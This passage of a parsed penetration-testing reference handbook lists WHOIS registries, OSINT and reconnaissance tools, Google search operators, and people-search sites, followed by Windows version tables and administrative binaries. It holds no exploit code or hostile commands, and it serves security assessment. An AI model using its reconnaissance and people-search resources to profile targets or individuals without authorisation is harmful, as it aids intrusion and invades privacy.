      "type": "paragraph",
      "content": "iana.org/numbers",
      "level": 0,
      "metadata": {
        "file_paths": [
          "iana.org"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IANA IP and ASN Lookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WHOIS Resources",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "icann.org",
      "level": 0,
      "metadata": {
        "file_paths": [
          "icann.org"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ICANN",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iana.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "iana.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IANA",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nro.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "nro.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NRO",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "afrinic.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "afrinic.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "AFRINIC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "apnic.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "apnic.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "APNIC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ws.arin.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ws.arin.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ARIN",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "lacnic.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "lacnic.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "LACNIC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ripe.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ripe.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RIPE",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "internic.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "internic.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "InterNIC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OSINT Resources",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Relationship and Recon Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "github.com/ElevenPaths/FOCA",
      "level": 0,
      "metadata": {
        "file_paths": [
          "github.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FOCA",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "github.com/laramies/theHarvester",
      "level": 0,
      "metadata": {
        "file_paths": [
          "github.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "theHarvester",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "maltego.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "maltego.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Maltego",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "https://github.com/lanmaster53/recon-ng",
      "level": 0,
      "metadata": {
        "urls": [
          "https://github.com/lanmaster53/recon-ng"
        ],
        "file_paths": [
          "//github.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Recon-ng Framework",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Google Searches",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "site:<URL>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Search only one",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "numrange:<START_NUMBER>…<ENDNUMBER>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Search within a number range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "date:<INTEGER>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Search within past [#] months",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "link:<URL>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Find pages that link to given URL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "related:<URL>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Find pages related to given URL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "intitle:<STRING>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Find pages with <STRING> in title",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "inurl:<STRING>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Find pages with <STRING> in URL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "filetype:<EXTENSION>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Search for files by file type",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "phonebook:<STRING>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Find phone book listings of <STRING>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: exploit-db.com/google-hacking-database",
      "level": 0,
      "metadata": {
        "file_paths": [
          "exploit-db.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "People Search",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "peekyou.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "peekyou.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PeekYou",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "spokeo.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "spokeo.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Spokeo",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "pipl.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "pipl.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Pipl",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "intelius.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "intelius.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Intelius",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "publicrecords.searchsystems.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "publicrecords.searchsystems.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Search Systems",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OSINT Websites",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "vulnerabilityassessment.co.uk/Penetration%20Test.html",
      "level": 0,
      "metadata": {
        "file_paths": [
          "vulnerabilityassessment.co.uk",
          "20Test.html"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "securitysift.com/passive-reconnaissance/",
      "level": 0,
      "metadata": {
        "file_paths": [
          "securitysift.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "pentest-standard.org/index.php/Intelligence_Gathering",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "onstrat.com/osint/",
      "level": 0,
      "metadata": {
        "file_paths": [
          "onstrat.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows OS Details",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details important Windows operating system information across many different versions such as: Windows XP, 7, 10, 11, and Windows Server. Details in this section include version number and dates released, administrative binary information, environmental variables, important registry locations and more.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 & 11 Versions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Date Released",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1511",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 – Threshold 2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2015-11-12",
      "level": 0,
      "metadata": {
        "dates": [
          "2015-11-12"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1607",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 – Redstone 1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2016-08-02",
      "level": 0,
      "metadata": {
        "dates": [
          "2016-08-02"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1703",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 – Redstone 2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2017-04-05",
      "level": 0,
      "metadata": {
        "dates": [
          "2017-04-05"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1709",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 – Redstone 3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2017-10-17",
      "level": 0,
      "metadata": {
        "dates": [
          "2017-10-17"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1803",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 – Redstone 4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2018-04-30",
      "level": 0,
      "metadata": {
        "dates": [
          "2018-04-30"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1809",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 – Redstone 5",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2018-11-13",
      "level": 0,
      "metadata": {
        "dates": [
          "2018-11-13"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1903",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 – 19H1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2019-05-21",
      "level": 0,
      "metadata": {
        "dates": [
          "2019-05-21"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1909",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 – Vanadium",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2019-11-12",
      "level": 0,
      "metadata": {
        "dates": [
          "2019-11-12"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2004",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 - Vibranium",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2020-05-27",
      "level": 0,
      "metadata": {
        "dates": [
          "2020-05-27"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "20H2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 - Vibranium",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2020-10-20",
      "level": 0,
      "metadata": {
        "dates": [
          "2020-10-20"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "21H1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 - Vibranium",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2021-05-18",
      "level": 0,
      "metadata": {
        "dates": [
          "2021-05-18"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "21H2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 - Vibranium",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2021-11-16",
      "level": 0,
      "metadata": {
        "dates": [
          "2021-11-16"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "21H2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 11 - Sun Valley",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2021-10-05",
      "level": 0,
      "metadata": {
        "dates": [
          "2021-10-05"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: Windows 10 versions include Home, Pro, Education, Enterprise, Pro for Workstations, Pro Education, Windows 10 S, and Windows 10 Enterprise LTSC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server Versions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Date Released",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1607",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server 2016",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2016-10-12",
      "level": 0,
      "metadata": {
        "dates": [
          "2016-10-12"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1709",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2017-10-17",
      "level": 0,
      "metadata": {
        "dates": [
          "2017-10-17"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1803",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2018-04-10",
      "level": 0,
      "metadata": {
        "dates": [
          "2018-04-10"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1809",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2018-11-13",
      "level": 0,
      "metadata": {
        "dates": [
          "2018-11-13"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1809",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server 2019",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2018-11-13",
      "level": 0,
      "metadata": {
        "dates": [
          "2018-11-13"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1903",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2019-11-12",
      "level": 0,
      "metadata": {
        "dates": [
          "2019-11-12"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1909",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2019-11-12",
      "level": 0,
      "metadata": {
        "dates": [
          "2019-11-12"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2004",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2020-06-26",
      "level": 0,
      "metadata": {
        "dates": [
          "2020-06-26"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "20H2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2020-10-20",
      "level": 0,
      "metadata": {
        "dates": [
          "2020-10-20"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "21H2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server 2022",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2021-08-18",
      "level": 0,
      "metadata": {
        "dates": [
          "2021-08-18"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: Windows servers include Windows Server Essentials, Windows Server Standard, Windows and Server Datacenter.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows “NT” Versions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 3.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "3.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows NT 3.1 (All)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 3.5",
      "level": 0,
      "metadata": {
        "file_paths": [
          "3.5"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows NT 3.5 (All)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 3.51",
      "level": 0,
      "metadata": {
        "file_paths": [
          "3.51"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows NT 3.51 (All)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 4.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "4.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows NT 4.0 (All)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 5.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "5.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows 2000 (All)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 5.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "5.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 5.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "5.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows XP (64-bit, Pro 64-bit)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 5.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "5.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows Server 2003 & R2 (Standard, Enterprise)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 5.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "5.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Home Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 6.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "6.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows Vista (Starter, Home, Basic, Home Premium,",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Business, Enterprise, Ultimate)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 6.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "6.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows Server 2008 (Foundation, Standard, Enterprise)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 6.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "6.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows 7 (Starter, Home, Pro, Enterprise, Ultimate)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 6.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "6.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows Server 2008 R2 (Foundation, Standard, Enterprise)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 6.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "6.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 6.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "6.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Phone 8",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 6.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "6.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows Server 2012 (Foundation, Essentials, Standard)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 6.3",
      "level": 0,
      "metadata": {
        "file_paths": [
          "6.3"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows 8.1 (Pro, Enterprise)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NT 10",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 version 1507",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Administrative Binaries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "lusrmgr.msc",
      "level": 0,
      "metadata": {
        "file_paths": [
          "lusrmgr.msc"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Local user and group manager",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "services.msc",
      "level": 0,
      "metadata": {
        "file_paths": [
          "services.msc"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Services control panel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "taskmgr.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "taskmgr.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Task manager",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "secpol.msc",
      "level": 0,
      "metadata": {
        "file_paths": [
          "secpol.msc"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Local security policy editor",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "eventvwr.msc",
      "level": 0,
      "metadata": {
        "file_paths": [
          "eventvwr.msc"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Event viewer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "regedit.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "regedit.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Registry editor",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "gpedit.msc",
      "level": 0,
      "metadata": {
        "file_paths": [
          "gpedit.msc"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Group policy editor",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "control.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "control.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Control panel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ncpa.cpl",
